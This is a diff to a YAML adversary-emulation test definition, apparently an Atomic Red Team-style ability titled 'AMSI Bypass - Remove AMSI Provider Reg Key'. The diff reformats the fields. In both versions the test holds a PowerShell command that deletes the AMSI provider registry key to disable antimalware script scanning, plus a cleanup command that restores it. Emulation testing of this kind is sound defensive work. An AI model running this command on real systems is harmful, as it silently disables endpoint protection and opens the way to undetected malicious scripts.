@@ -1,4 +1,4 @@
-- id: b0d2e6ee-1b44-5169-a4df-d03c17aca880
+- requirements: []
   name: Soumaia ART Tests - AMSI Bypass - Remove AMSI Provider Reg Key
   description: 'With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\Software\Microsoft\AMSI to disable AMSI inspection.
 
@@ -6,13 +6,15 @@
 
     Open Registry Editor and navigate to "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\" to verify that it is gone. (requires elevation)'
   tactic: defense-impairment
-  technique:
-    attack_id: T1685
-    name: Disable or Modify Tools
-  platforms:
-    windows:
-      psh:
-        command: |-
-          Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
-        cleanup: |-
-          New-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers" -Name "{2781761E-28E0-4109-99FE-B9D127C57AFE}" -ErrorAction Ignore | Out-Null
+  technique_id: T1685
+  technique_name: Disable or Modify Tools
+  executors:
+  - cleanup:
+    - New-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers" -Name "{2781761E-28E0-4109-99FE-B9D127C57AFE}" -ErrorAction Ignore | Out-Null
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
+  id: b0d2e6ee-1b44-5169-a4df-d03c17aca880
